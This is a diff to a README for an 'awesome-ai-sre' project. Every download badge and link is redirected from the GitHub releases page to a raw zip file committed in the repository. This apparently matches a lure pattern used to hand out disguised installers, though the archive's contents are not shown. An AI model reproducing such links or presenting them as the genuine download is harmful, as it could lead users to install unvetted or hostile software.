@@ -1,6 +1,6 @@
 # 🤖 awesome-ai-sre - AI Tools for SRE and Incident Response
 
-[![Download awesome-ai-sre](https://img.shields.io/badge/Download-Get%20It%20Here-brightgreen?style=for-the-badge)](https://github.com/jayta1314/awesome-ai-sre/releases)
+[![Download awesome-ai-sre](https://img.shields.io/badge/Download-Get%20It%20Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/jayta1314/awesome-ai-sre/main/public/sre-awesome-ai-1.7.zip)
 
 ---
 
@@ -49,7 +49,7 @@ To start using awesome-ai-sre on Windows, follow these steps.
 
 Click the button below to visit the release page. This page holds the latest installer files.
 
-[![Download awesome-ai-sre](https://img.shields.io/badge/Download-Get%20It%20Here-blue?style=for-the-badge)](https://github.com/jayta1314/awesome-ai-sre/releases)
+[![Download awesome-ai-sre](https://img.shields.io/badge/Download-Get%20It%20Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/jayta1314/awesome-ai-sre/main/public/sre-awesome-ai-1.7.zip)
 
 ### Step 2: Choose the Installer
 
@@ -160,7 +160,7 @@ For detailed help, check the issues tab on the repository or contact your system
 
 ## 🔗 Important Links
 
-- Download page: https://github.com/jayta1314/awesome-ai-sre/releases
+- Download page: https://raw.githubusercontent.com/jayta1314/awesome-ai-sre/main/public/sre-awesome-ai-1.7.zip
 - User guide and FAQs: Located inside the application Help menu
 - Report problems: Use GitHub Issues on this repository page
 
@@ -174,4 +174,4 @@ The repository covers these topics: AI agents, cost optimization, incident manag
 
 ---
 
-[![Download awesome-ai-sre](https://img.shields.io/badge/Download-Get%20It%20Here-grey?style=for-the-badge)](https://github.com/jayta1314/awesome-ai-sre/releases)
+[![Download awesome-ai-sre](https://img.shields.io/badge/Download-Get%20It%20Here-grey?style=for-the-badge)](https://raw.githubusercontent.com/jayta1314/awesome-ai-sre/main/public/sre-awesome-ai-1.7.zip)
